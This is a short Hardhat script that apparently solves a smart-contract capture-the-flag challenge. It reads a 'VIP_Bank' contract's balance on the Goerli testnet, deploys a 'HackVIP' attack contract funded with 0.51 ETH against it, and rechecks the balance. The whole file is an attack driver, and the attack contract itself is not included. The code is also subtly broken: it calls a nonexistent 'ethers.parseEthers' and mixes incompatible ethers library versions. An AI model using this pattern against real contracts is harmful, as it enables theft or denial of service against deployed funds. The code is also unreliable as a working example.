require("dotenv").config();
const { Wallet } = require("ethers");
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
  const address = "0x28e42E7c4bdA7c0381dA503240f2E54C70226Be2";

  //balance before sending ETH
  const rpc = new ethers.providers.JsonRpcBatchProvider(process.env.GOERLI_URL);
  const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, rpc);
  const vip = await hre.ethers.getContractAt("VIP_Bank", address, wallet);
  const vipBalance = await vip.contractBalance();
  console.log("vipBalance is: ", vipBalance, "ETH");

  // deploy our attack contract
  const attack = await hre.ethers.getContractFactory("HackVIP");
  const Attack = await attack.deploy(address, {
    value: ethers.parseEthers("0.51"),
  });
  console.log("deploying HackVip");
  await Attack.deployed();
  console.log("HackVip address at :", Attack.address);

  // let's check the VIP_Bank address after deployement
  const vipBalanceAfter = await vip.contractBalance();
  console.log("vipBalance after is: ", vipBalanceAfter, "ETH");
}


main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
